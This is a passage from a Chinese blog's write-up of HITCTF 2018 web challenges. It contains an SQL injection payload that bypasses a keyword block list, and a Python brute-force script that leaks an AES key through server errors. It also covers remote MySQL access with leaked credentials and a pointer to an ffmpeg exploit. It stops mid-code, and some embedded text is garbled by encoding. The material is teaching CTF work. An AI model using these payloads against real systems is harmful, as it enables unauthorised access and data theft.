<!DOCTYPE html>
<html lang="pt">

  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>[hitctf] Web Writeup | Pr0ph3t's blog</title>

    <!-- Bootstrap -->
    <link rel="stylesheet" href="/assets/css/bootstrap-3.3.6/css/bootstrap.min.css">
    <link rel="stylesheet" href="/assets/css/main.css">
    <link rel="stylesheet" href="https://libs.cdnjs.net/fancybox/3.5.7/jquery.fancybox.min.css">

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
        <![endif]-->
    <link rel="shortcut icon" href="/assets/images/favicon.png">

    <link rel="alternate" type="application/atom+xml" title="Atom Feed" href="/feed/"> 

</head>


    <body>
      <div class="container">

        <header class="row">
  <div class="col-lg-8 col-lg-offset-2">
    <h1 class="">Pr0ph3t</h1>
    <p>
    <span class="reserved">char</span> nick[<span class="number">7</span>] = <span class="string">"Pr0ph3t"</span>;
    </p>
    <p>
    printf(<a href="https://github.com/t3hp0rP" target="_blank"><span class="string">"https://github.com/<span class="reserved">%s\n</span>"</span></a>,nick);
    </p>
    <p>
    printf(<span class="string">"<span class="reserved">%s\x40</span>pr0ph3t<span class="reserved">\x2e\\\b</span>com<span class="reserved">\n</span>"</span>,<span class="string">"admin"</span>);
    </p>
    <!-- <p>
            printf(<a href="https://blog.pr0ph3t.com" target="_blank"><span class="string">"https://<span class="reserved">%s</span>.pr0ph3t.com<span class="reserved">\n</span>"</span></a>,nick);
        </p> -->
    <p>
    puts(<a href="/assets/misc/pubkey.gpg.txt" target="_blank"><span class="string">"91B6 191A C2C3 285C 201D  801B B5A3 6B56 8528 E140"</span></a>);
    </p>
  </div>
</header>

<div class="row">
  <div class="col-lg-8 col-lg-offset-2">
    <div class="menu">
      <ul>
          <li><a href="/">home</a></li>
          <li><a href="/articles/">articles</a></li>
          <li><a href="/friendlink">friends</a></li>
      </ul>
    </div>
  </div>
</div>



        <div class="row">
          <div class="col-lg-8 col-lg-offset-2">
            <main>
            <div class="post">

  <header class="post-header">
    <h1>[hitctf] Web Writeup</h1>
  </header>

  <article class="post-content">
  <div class="post">

  <header class="post-header">
    <p class="meta">
        Feb 3, 2018
        
        
        •
        <span><a href="/category/#CyberSecurity" class="reserved">CyberSecurity</a>,</span><span><a href="/category/#writeup" class="reserved">writeup</a>,</span><span><a href="/category/#old" class="reserved">old</a></span>
        
          <span id="/posts/hitctf-Web-Writeup/" class="leancloud_visitors" data-flag-title="[hitctf] Web Writeup">
            Page view:
            <span class="leancloud-visitors-count"></span>
          </span>
        
    </p>
  </header>

  <article class="post-content">
  <h3 id="php-reading">PHP reading</h3>
<p><img src="/assets/images/posts/2018/hitctf-Web-Writeup/1.png" alt="PHP reading" /></p>

<ul>
  <li>上扫描器扫出index.php.bak 下载”源码”</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 
    <span class="k">eval</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="s1">'JGZsYWc9JF9HRVRbJ2FzZGZnanh6a2FsbGdqODg1MiddO2lmKCRmbGFnPT0nSDFUY3RGMjAxOEV6Q1RGJyl7ZGllKCRmbGFnKTt9ZGllKCdlbW1tbScpOw=='</span><span class="p">))</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>里面的内容base64decode之后是源码</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$flag</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'asdfgjxzkallgj8852'</span><span class="p">];</span><span class="k">if</span><span class="p">(</span><span class="nv">$flag</span><span class="o">==</span><span class="s1">'H1TctF2018EzCTF'</span><span class="p">){</span><span class="k">die</span><span class="p">(</span><span class="nv">$flag</span><span class="p">);}</span><span class="k">die</span><span class="p">(</span><span class="s1">'emmmm'</span><span class="p">);</span>
</code></pre></div></div>

<p>输入url<code class="highlighter-rouge">http://198.13.58.35:8899?asdfgjxzkallgj8852= H1TctF2018EzCTF</code>之后得到flag</p>

<h3 id="babyeval">BabyEval</h3>
<p><img src="/assets/images/posts/2018/hitctf-Web-Writeup/2.png" alt="BabyEval" /></p>

<ul>
  <li>进入之后查看html源码发现题目源码</li>
</ul>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!--
$str=@(string)$_GET['str'];
blackListFilter($black_list, $str);
eval('$str="'.addslashes($str).'";');
--&gt;</span>
</code></pre></div></div>

<ul>
  <li>以前一航师傅分析过这一题
<a href="https://www.jianshu.com/p/dd72566ca4df">https://www.jianshu.com/p/dd72566ca4df</a>
我觉得可能是可变变量的简写形式导致的这个问题,如文档所说</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$aaa</span> <span class="o">=</span> <span class="s1">'phpinfo'</span><span class="p">;</span>
<span class="nv">$b</span> <span class="o">=</span> <span class="s1">'aaa'</span><span class="p">;</span>
<span class="k">echo</span> <span class="nv">$$b</span><span class="p">;</span> <span class="c1">//输出phpinfo</span>

<span class="c1">////////////</span>

<span class="nv">$a</span> <span class="o">=</span> <span class="s1">'phpinfo'</span><span class="p">;</span>
<span class="nv">$b</span> <span class="o">=</span> <span class="s1">'aaa'</span><span class="p">;</span>
<span class="k">echo</span> <span class="nv">${$b}</span><span class="p">;</span> <span class="c1">//也输出phpinfo</span>
<span class="c1">//则以下也是正确的</span>
<span class="k">echo</span> <span class="err">$</span><span class="p">{</span><span class="s1">'aaa'</span><span class="p">};</span> <span class="c1">//也输出phpinfo</span>
<span class="k">echo</span> <span class="err">$</span><span class="p">{</span><span class="s1">'a'</span><span class="o">+</span><span class="s1">'aa'</span><span class="p">};</span> <span class="c1">//也输出phpinfo</span>
</code></pre></div></div>

<p><img src="/assets/images/posts/2018/hitctf-Web-Writeup/3.png" alt="try" />做了一下尝试,花括号内是可以执行运算的,并且会强制类型转换成字符串,猜测是类似一个eval再强制转换成字符串?留个坑…以后研究源码的时候再看看….</p>

<h3 id="babyleakage">BabyLeakage</h3>
<p><img src="/assets/images/posts/2018/hitctf-Web-Writeup/4.png" alt="BabyLeakage" /></p>

<ul>
  <li>
    <p>题目疯狂引导我们去使应用出错<img src="/assets/images/posts/2018/hitctf-Web-Writeup/5.png" alt="通知" />
<img src="/assets/images/posts/2018/hitctf-Web-Writeup/6.png" alt="锦囊" /></p>
  </li>
  <li>
    <p>首先试一试url方面
<img src="/assets/images/posts/2018/hitctf-Web-Writeup/7.png" alt="route_error" /></p>
  </li>
  <li>
    <p>逐个尝试之后在news/auth路由下发现了一个奇怪的报错
<img src="/assets/images/posts/2018/hitctf-Web-Writeup/8.png" alt="error" />
其中更是爆出了mysql的账号密码<img src="/assets/images/posts/2018/hitctf-Web-Writeup/9.png" alt="info" /></p>
  </li>
  <li>
    <p>我们探测一下该ip的mysql默认端口的情况<img src="/assets/images/posts/2018/hitctf-Web-Writeup/10.png" alt="mysql-3306" /></p>
  </li>
  <li>既然开启的话我们尝试远程登录
<img src="/assets/images/posts/2018/hitctf-Web-Writeup/11.png" alt="mysql-login" />
bingo!</li>
  <li>最后在F1agIsHere库的表描述下找到flag</li>
</ul>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; use F1agIsHere<span class="p">;</span>
Reading table information <span class="k">for </span>completion of table and column names
You can turn off this feature to get a quicker startup with <span class="nt">-A</span>

Database changed
mysql&gt; show tables<span class="p">;</span>
+----------------------+
| Tables_in_F1agIsHere |
+----------------------+
| a                    |
| f                    |
| g                    |
| l                    |
+----------------------+
4 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.05 sec<span class="o">)</span>

mysql&gt; describe f<span class="p">;</span>
+-------+------+------+-----+---------+-------+
| Field | Type | Null | Key | Default | Extra |
+-------+------+------+-----+---------+-------+
| H     | text | YES  |     | NULL    |       |
| I     | text | YES  |     | NULL    |       |
| TC    | text | YES  |     | NULL    |       |
| T     | text | YES  |     | NULL    |       |
| F     | text | YES  |     | NULL    |       |
+-------+------+------+-----+---------+-------+
5 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.04 sec<span class="o">)</span>

mysql&gt; describe l<span class="p">;</span>
+---------+------+------+-----+---------+-------+
| Field   | Type | Null | Key | Default | Extra |
+---------+------+------+-----+---------+-------+
| <span class="o">{</span>       | text | YES  |     | NULL    |       |
| C10se_  | text | YES  |     | NULL    |       |
| Debu91n | text | YES  |     | NULL    |       |
+---------+------+------+-----+---------+-------+
3 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.05 sec<span class="o">)</span>

mysql&gt; describe a<span class="p">;</span>
+----------+------+------+-----+---------+-------+
| Field    | Type | Null | Key | Default | Extra |
+----------+------+------+-----+---------+-------+
| fo_Is_Im | text | YES  |     | NULL    |       |
| mmp      | text | YES  |     | NULL    |       |
| ort      | text | YES  |     | NULL    |       |
+----------+------+------+-----+---------+-------+
3 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.05 sec<span class="o">)</span>

mysql&gt; describe g<span class="p">;</span>
+-------+------+------+-----+---------+-------+
| Field | Type | Null | Key | Default | Extra |
+-------+------+------+-----+---------+-------+
| 4n7   | text | YES  |     | NULL    |       |
| <span class="o">}</span>     | text | YES  |     | NULL    |       |
+-------+------+------+-----+---------+-------+
2 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.06 sec<span class="o">)</span>

mysql&gt; 
</code></pre></div></div>

<h3 id="babyinjection">BabyInjection</h3>
<p><img src="/assets/images/posts/2018/hitctf-Web-Writeup/12.png" alt="BabyInjection" /></p>

<ul>
  <li>题目给了源码</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'passwd'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s1">'Login and get the flag'</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s1">'&lt;form action="" method="post"&gt;'</span><span class="o">.</span><span class="s2">"&lt;br/&gt;"</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s1">'&lt;input name="username" type="text" placeholder="username"/&gt;'</span><span class="o">.</span><span class="s2">"&lt;br/&gt;"</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s1">'&lt;input name="passwd" type="text" placeholder="passwd"/&gt;'</span><span class="o">.</span><span class="s2">"&lt;br/&gt;"</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s1">'&lt;input type="submit" &gt;&lt;/input&gt;'</span><span class="o">.</span><span class="s2">"&lt;br/&gt;"</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s1">'&lt;/form&gt;'</span><span class="o">.</span><span class="s2">"&lt;br/&gt;"</span><span class="p">;</span>
    <span class="k">die</span><span class="p">;</span>
<span class="p">}</span>

<span class="nv">$flag</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
<span class="nv">$filter</span> <span class="o">=</span> <span class="s2">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)|like|rlike|regexp|limit|or"</span><span class="p">;</span>

<span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">];</span>
<span class="nv">$passwd</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'passwd'</span><span class="p">];</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/"</span><span class="o">.</span><span class="nv">$filter</span><span class="o">.</span><span class="s2">"/is"</span><span class="p">,</span><span class="nv">$username</span><span class="p">)</span><span class="o">==</span><span class="mi">1</span><span class="p">){</span>
    <span class="k">die</span><span class="p">(</span><span class="s2">"Hacker hacker hacker~"</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/"</span><span class="o">.</span><span class="nv">$filter</span><span class="o">.</span><span class="s2">"/is"</span><span class="p">,</span><span class="nv">$passwd</span><span class="p">)</span><span class="o">==</span><span class="mi">1</span><span class="p">){</span>
    <span class="k">die</span><span class="p">(</span><span class="s2">"Hacker hacker hacker~"</span><span class="p">);</span>
<span class="p">}</span>

<span class="nv">$conn</span> <span class="o">=</span> <span class="nb">mysqli_connect</span><span class="p">();</span>

<span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT * FROM users WHERE username='</span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">';"</span><span class="p">;</span>
<span class="k">echo</span> <span class="nv">$query</span><span class="o">.</span><span class="s2">"&lt;br&gt;"</span><span class="p">;</span>
<span class="nv">$query</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span> <span class="nv">$query</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="nx">mysqli_num_rows</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">){</span>
    <span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'passwd'</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$passwd</span><span class="p">){</span>
        <span class="k">die</span><span class="p">(</span><span class="s1">'you did it and this is your flag: '</span><span class="o">.</span><span class="nv">$flag</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span><span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s1">'Wrong password'</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">else</span><span class="p">{</span>
    <span class="k">die</span><span class="p">(</span><span class="s1">'Wrong username'</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>ban掉了很多关键字
而且从ban list里面感觉到出题人并不是想我们找出真正的密码,而是单纯的绕过,是以前碰到的一个题目的套路,首先可以用group by passwd with rollup来制造一个空行(利用统计函数,查询结果多一行并且passwd为空),这里本来可以直接用limit筛选出我们需要的那个空行,但是这里limit被ban了,没关系,还可以用having子句来筛选出我们需要的带有空字段的行,因为having子句是再分组查询之后再执行的,所以最后post payload如下<code class="highlighter-rouge">username='|| 1 group by passwd with rollup having passwd is null#&amp;passwd=</code></li>
</ul>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; use <span class="nb">test</span><span class="p">;</span>
Reading table information <span class="k">for </span>completion of table and column names
You can turn off this feature to get a quicker startup with <span class="nt">-A</span>

Database changed
mysql&gt; describe <span class="nb">test</span><span class="p">;</span>
+-------+--------------+------+-----+---------+-------+
| Field | Type         | Null | Key | Default | Extra |
+-------+--------------+------+-----+---------+-------+
| <span class="nb">id</span>    | int<span class="o">(</span>11<span class="o">)</span>      | NO   | PRI | NULL    |       |
| phone | varchar<span class="o">(</span>255<span class="o">)</span> | YES  |     | NULL    |       |
+-------+--------------+------+-----+---------+-------+
2 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>

mysql&gt; <span class="k">select</span> <span class="k">*</span> from <span class="nb">test</span><span class="p">;</span>
+----+---------+
| <span class="nb">id</span> | phone   |
+----+---------+
|  1 | <span class="s1">' or 1# |
+----+---------+
1 row in set (0.00 sec)

mysql&gt; select id,phone from test where id=0 or 1 group by id,phone with rollup;
+----+---------+
| id | phone   |
+----+---------+
|  1 | '</span> or 1# |
|  1 | NULL    |
| NULL | NULL    |
+----+---------+
3 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>

mysql&gt; <span class="k">select </span><span class="nb">id</span>,phone from <span class="nb">test </span>where <span class="nb">id</span><span class="o">=</span>0 or 1 group by <span class="nb">id </span>with rollup<span class="p">;</span>
+----+---------+
| <span class="nb">id</span> | phone   |
+----+---------+
|  1 | <span class="s1">' or 1# |
| NULL | '</span> or 1# |
+----+---------+
2 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>

mysql&gt; <span class="k">select </span><span class="nb">id</span>,phone from <span class="nb">test </span>where <span class="nb">id</span><span class="o">=</span>0 or 1 group by phone with rollup<span class="p">;</span>
+----+---------+
| <span class="nb">id</span> | phone   |
+----+---------+
|  1 | <span class="s1">' or 1# |
|  1 | NULL    |
+----+---------+
2 rows in set (0.00 sec)

mysql&gt; select id,phone from test where id=0 or 1 group by phone with rollup having phone is null;
+----+-------+
| id | phone |
+----+-------+
|  1 | NULL  |
+----+-------+
1 row in set (0.01 sec)

mysql&gt; 
</span></code></pre></div></div>

<h3 id="小电影">小电影</h3>
<p><img src="/assets/images/posts/2018/hitctf-Web-Writeup/13.png" alt="小电影" /></p>

<p>ffmpeg的漏洞http://www.freebuf.com/column/142775.html
exp : https://github.com/neex/ffmpeg-avi-m3u-xbin
根据html源码提示利用exp去读flag文件即可</p>

<h3 id="securepy">SecurePY</h3>
<p><img src="/assets/images/posts/2018/hitctf-Web-Writeup/14.png" alt="SecurePY" /></p>

<p>hint说python的缓存,并且给了uwsgi的配置项</p>

<p>在<a href="http://123.206.83.157:8000/\_\_pycache\_\_/app.cpython-35.pyc">http://123.206.83.157:8000/__pycache__/app.cpython-35.pyc</a>下载源码,源码如下:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
# visit http://tool.lu/pyc/ for more information
</span><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">jsonify</span><span class="p">,</span> <span class="n">render_template</span>
<span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
<span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">b2a_hex</span><span class="p">,</span> <span class="n">a2b_hex</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
<span class="n">flag_key</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">[</span><span class="s">'KEY'</span><span class="p">]</span>
<span class="n">flag_enc</span> <span class="o">=</span> <span class="s">'9cf742955633f38d9c628bc9a9f98db042c6e4273a99944bc4cd150a0f7b9f317f52030329729ccf80798690667a0add'</span>

<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'index.html'</span><span class="p">,</span> <span class="n">flag_enc</span> <span class="o">=</span> <span class="n">flag_enc</span><span class="p">)</span>

<span class="n">index</span> <span class="o">=</span> <span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/'</span><span class="p">)(</span><span class="n">index</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">getflag</span><span class="p">():</span>
    <span class="n">req</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">json</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">req</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">result</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span>
    <span class="k">if</span> <span class="bp">None</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">req</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">result</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span>
    <span class="n">key</span> <span class="o">=</span> <span class="n">req</span><span class="p">[</span><span class="s">'key'</span><span class="p">]</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag_key</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">result</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">flag_key</span><span class="p">):</span>
        <span class="k">if</span> <span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">y</span><span class="p">):</span>
            <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">result</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span>
    <span class="n">cryptor</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="s">b'0000000000000000'</span><span class="p">)</span>
    <span class="n">plain_text</span> <span class="o">=</span> <span class="n">cryptor</span><span class="p">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">a2b_hex</span><span class="p">(</span><span class="n">flag_enc</span><span class="p">))</span>
    <span class="n">flag</span> <span class="o">=</span> <span class="n">plain_text</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">result</span> <span class="o">=</span> <span class="bp">True</span><span class="p">,</span> <span class="n">flag</span> <span class="o">=</span> <span class="n">flag</span><span class="p">)</span>

<span class="n">getflag</span> <span class="o">=</span> <span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/getflag'</span><span class="p">,</span> <span class="n">methods</span> <span class="o">=</span> <span class="p">[</span>
    <span class="s">'POST'</span><span class="p">])(</span><span class="n">getflag</span><span class="p">)</span>
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">app</span><span class="p">.</span><span class="n">run</span><span class="p">()</span>
</code></pre></div></div>

<ul>
  <li>首先flag是经过AES加密的,我们需要找到key去解密,而且我们得先知道key的长度(在这里很明显是16位),然后题目有一处逐位比较的地方,<code class="highlighter-rouge">ord(x) ^ ord(y)</code>,通过这个地方我们能一位位构造爆破,但是问题是我们如何区别爆破成功和爆破失败?</li>
  <li>这里涉及到python的序列化json后转换的对象问题,https://docs.python.org/3/library/json.html#encoders-and-decoders
如果遇到null就会被转换成None,遇到ord(None)的时候python就会抛出错误<img src="/assets/images/posts/2018/hitctf-Web-Writeup/15.png" alt="error" />尝试一下<img src="/assets/images/posts/2018/hitctf-Web-Writeup/16.png" alt="500 error" />
<img src="/assets/images/posts/2018/hitctf-Web-Writeup/17.png" alt="return false" />
这样的话我们就能够根据是否500来爆破我们需要的key了
爆破脚本</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">se</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>

<span class="n">key</span> <span class="o">=</span> <span class="p">[</span><span class="bp">None</span><span class="p">,</span><span class="bp">None</span><span class="p">,</span><span class="bp">None</span><span class="p">,</span><span class="bp">None</span><span class="p">,</span><span class="bp">None</span><span class="p">,</span><span class="bp">None</span><span class="p">,</span><span class="bp">None</span><span class="p">,</span><span class="bp">None</span><span class="p">,</span><span class="bp">None</span><span class="p">,</span><span class="bp">None</span><span class="p">,</span><span class="bp">None</span><span class="p">,</span><span class="bp">None</span><span class="p">,</span><span class="bp">None</span><span class="p">,</span><span class="bp">None</span><span class="p">,</span><span class="bp">None</span><span class="p">,</span><span class="bp">None</span><span class="p">]</span>
<span class="n">realkey</span> <span class="o">=</span> <span class="s">''</span>

<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">16</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span><span class="mi">128</span><span class="p">):</span>
        <span class="n">key</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">y</span><span class="p">))</span>
        <span class="n">test</span> <span class="o">=</span> <span class="p">{</span><span class="s">"key"</span> <span class="p">:</span> <span class="n">key</span><span class="p">}</span>
        <span class="n">res</span> <span class="o">=</span> <span class="n">se</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">'http://123.206.83.157:8000/getflag'</span><span class="p">,</span><span class="n">json</span><span class="o">=</span><span class="n">test</span><span class="p">)</span>
        <span class="c1"># print res.content
</span>        <span class="c1"># exit()
</span>        <span class="k">if</span> <span class="s">'500'</span> <span class="ow">in</span> <span class="n">res</span><span class="p">.</span><span class="n">content</span><span class="p">:</span>
            <span class="k">print</span> <span class="nb">str</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">y</span><span class="p">))</span>
            <span class="n">realkey</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">y</span><span class="p">))</span>
            <span class="k">break</span>
<span class="k">print</span> <span class="n">realkey</span>
</code></pre></div></div>

<p>得到key : <code class="highlighter-rouge">5ecur3pPYpyPYk3y</code>
提交之后得到flag</p>

<p>参考:https://chybeta.github.io/2017/09/05/TWCTF-2017-Super-Secure-Storage-writeup/</p>

<h3 id="babywrite">BabyWrite</h3>
<p><img src="/assets/images/posts/2018/hitctf-Web-Writeup/18.png" alt="BabyWrite" />
<img src="/assets/images/posts/2018/hitctf-Web-Writeup/19.png" alt="index.php" /></p>
<ul>
  <li>一看到这个url就想到了这个login很有可能是login.php被包含进来的, 遂直接访问login.php发现是可以的,所以直接用伪协议读取文件内容
<img src="/assets/images/posts/2018/hitctf-Web-Writeup/20.png" alt="php wrapper" />
源码如下:</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;title&gt;</span>CTF<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>

    ç»éè§£éæ´å¤åè½
    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"login.php"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
        ç¨æ·å : <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"username"</span> <span class="na">placeholder=</span><span class="s">"username"</span><span class="nt">&gt;&lt;br/&gt;</span>
        å¯ç  : <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"password"</span> <span class="na">placeholder=</span><span class="s">"password"</span><span class="nt">&gt;&lt;br/&gt;&lt;br/&gt;</span>
        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"ç»é"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>

<span class="cp">&lt;?php</span>
    <span class="k">require_once</span><span class="p">(</span><span class="s1">'config.php'</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">])){</span>
        <span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">];</span>
        <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">];</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$username</span> <span class="o">===</span> <span class="s2">"admin"</span> <span class="o">&amp;&amp;</span> <span class="nb">sha1</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$password</span><span class="p">))</span> <span class="o">===</span> <span class="nv">$admin_hash</span><span class="p">){</span>
            <span class="k">echo</span> <span class="s1">'&lt;script&gt;alert("Login seccess!");&lt;/script&gt;'</span><span class="p">;</span>
        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'debug'</span><span class="p">])){</span>
